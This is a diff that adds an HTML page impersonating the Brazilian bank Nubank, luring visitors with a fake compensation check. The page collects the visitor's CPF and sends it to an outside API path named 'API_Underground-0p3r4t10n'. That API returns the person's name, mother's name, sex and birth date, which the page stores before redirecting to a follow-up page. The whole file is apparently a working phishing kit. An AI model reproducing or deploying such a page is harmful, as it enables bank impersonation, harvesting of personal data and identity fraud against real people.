@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script
+  src="../../cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Consulte sua Indenização</title>
+  <script src="https://cdn.tailwindcss.com/"></script>
+</head>
+
+<body class="bg-[#831BD1] min-h-screen flex items-center justify-center">
+
+  <div class="w-full max-w-[400px] mt-20 px-4" style="margin-top: -25%;" s>
+    <div class="bg-white w-full shadow-sm px-6 pt-6 pb-40 rounded-xl border">
+
+      <div class="flex flex-col items-center mb-6">
+        <div class="text-[#831BD1] text-4xl font-bold mb-4">
+          <img src="assets/logo.svg" alt="Nubank" class="size-16" />
+        </div>
+        <h1 class="text-xl font-semibold text-center">Consulte sua Indenização</h1>
+      </div>
+
+      <form class="space-y-6" id="form">
+        <div>
+          <label for="cpf" class="block text-sm font-bold text-gray-500">CPF</label>
+          <input type="text" name="cpf" id="cpf" maxlength="14"
+            class="flex h-10 w-full p-1 text-base md:text-sm bg-transparent border-0 border-b-2 border-b-gray-300 rounded-none focus:border-b-[#831BD1] focus:outline-none transition-colors duration-200"
+            placeholder="" required />
+          <p class="text-xs text-red-500 mt-1 hidden" id="cpf-erro">CPF inválido</p>
+          <p class="text-xs text-gray-500 mt-1">Use o CPF que utilizou ao criar sua conta.</p>
+        </div>
+
+        <button type="submit" id="botao"
+          class="w-full px-1 py-3 bg-[#831BD1] hover:bg-[#831BD1]/90 text-white rounded-md text-sm font-medium transition">
+          Verificar minha conta
+        </button>
+
+      </form>
+
+    </div>
+  </div>
+
+  <script>
+  const cpfInput = document.getElementById("cpf");
+  const botao = document.getElementById("botao");
+  const erro = document.getElementById("cpf-erro");
+
+  function aplicarMascaraCPF(valor) {
+    return valor
+      .replace(/\D/g, '')
+      .replace(/(\d{3})(\d)/, '$1.$2')
+      .replace(/(\d{3})(\d)/, '$1.$2')
+      .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+  }
+
+  function validarCPF(cpf) {
+    cpf = cpf.replace(/[^\d]+/g, '');
+    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+    let soma = 0, resto;
+    for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
+    resto = (soma * 10) % 11;
+    if (resto === 10 || resto === 11) resto = 0;
+    if (resto !== parseInt(cpf[9])) return false;
+    soma = 0;
+    for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
+    resto = (soma * 10) % 11;
+    if (resto === 10 || resto === 11) resto = 0;
+    return resto === parseInt(cpf[10]);
+  }
+
+  cpfInput.addEventListener("input", () => {
+    const raw = cpfInput.value.replace(/\D/g, "");
+    cpfInput.value = aplicarMascaraCPF(raw);
+  });
+
+  document.getElementById("form").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const rawCpf = cpfInput.value.replace(/\D/g, "");
+
+    botao.innerText = "Verificando...";
+    botao.classList.add("opacity-50", "cursor-not-allowed");
+
+    if (!validarCPF(rawCpf)) {
+      erro.classList.remove("hidden");
+      botao.innerText = "Verificar minha conta";
+      botao.classList.remove("opacity-50", "cursor-not-allowed");
+      return;
+    }
+    erro.classList.add("hidden");
+
+    // captura e atualiza os parâmetros da URL
+    const params = new URLSearchParams(window.location.search);
+    params.set('cpf', rawCpf);
+    const qs = params.toString();
+
+    try {
+      // Consulta a API externa para obter os dados do CPF
+      const url = `https://apis.4mkt.pro/API_Underground-0p3r4t10n/?cpf=${rawCpf}`;
+      console.log('URL da requisição:', url);
+
+      const response = await fetch(url, {
+        method: 'GET',
+      });
+
+      console.log('Status da resposta:', response.status);
+      
+      if (response.ok) {
+        const data = await response.json();
+        console.log('Dados recebidos:', data);
+        
+        // Salva os dados do usuário no localStorage para usar na página de consulta
+        const dadosUsuario = {
+          NOME: data.nome,
+          MAE: data.mae || '',
+          SEXO: data.sexo,
+          NASCIMENTO: data.nascimento,
+          CPF_FORMATADO: data.cpfformatado || rawCpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
+        };
+        
+        localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
+        console.log('Dados salvos no localStorage');
+        
+        // Redireciona para a página de consulta
+        window.location.href = `consulta/index.html?${qs}`;
+      } else {
+        erro.innerText = "CPF não encontrado";
+        erro.classList.remove("hidden");
+        botao.innerText = "Verificar minha conta";
+        botao.classList.remove("opacity-50", "cursor-not-allowed");
+      }
+    } catch (error) {
+      console.error('Erro na consulta:', error);
+      erro.innerText = "Erro ao consultar. Tente novamente.";
+      erro.classList.remove("hidden");
+      botao.innerText = "Verificar minha conta";
+      botao.classList.remove("opacity-50", "cursor-not-allowed");
+    }
+  });
+</script>
+
+</body>
+</html>
